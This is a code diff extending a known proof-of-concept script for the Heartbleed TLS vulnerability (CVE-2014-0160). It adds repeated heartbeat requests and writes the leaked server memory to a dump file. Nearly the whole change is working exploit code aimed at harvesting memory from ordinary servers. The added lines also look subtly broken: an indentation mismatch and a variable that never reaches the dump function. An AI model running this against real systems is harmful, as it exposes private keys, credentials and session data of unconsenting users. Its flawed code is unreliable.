@@ -2,6 +2,7 @@
 
 # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code.
+# http://s3.jspenguin.org/ssltest.py
 
 import sys
 import struct
@@ -13,6 +14,10 @@ from optparse import OptionParser
 
 options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
 options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
+options.add_option('-n', '--num', type='int', default=1, help='Number of heartbeats to send if vulnerable (defines how much memory you get back) (default: 1)')
+options.add_option('-f', '--file', type='str', default='dump.bin', help='Filename to write dumped memory too (default: dump.bin)')
+
+dumpf = 'dump.bin'
 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
@@ -41,6 +46,9 @@ hb = h2bin('''
 ''')
 
 def hexdump(s):
+    dump = open(dumpf,'a')
+    dump.write(s)
+    dump.close()
     for b in xrange(0, len(s), 16):
         lin = [c for c in s[b : b + 16]]
         hxdat = ' '.join('%02X' % ord(c) for c in lin)
@@ -108,7 +116,8 @@ def main():
     if len(args) < 1:
         options.print_help()
         return
-
+	
+	dumpf = opts.file
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print 'Connecting...'
     sys.stdout.flush()
@@ -129,8 +138,9 @@ def main():
 
     print 'Sending heartbeat request...'
     sys.stdout.flush()
-    s.send(hb)
-    hit_hb(s)
+    for i in xrange(0,opts.num):
+        s.send(hb)
+        hit_hb(s)
 
 if __name__ == '__main__':
     main()
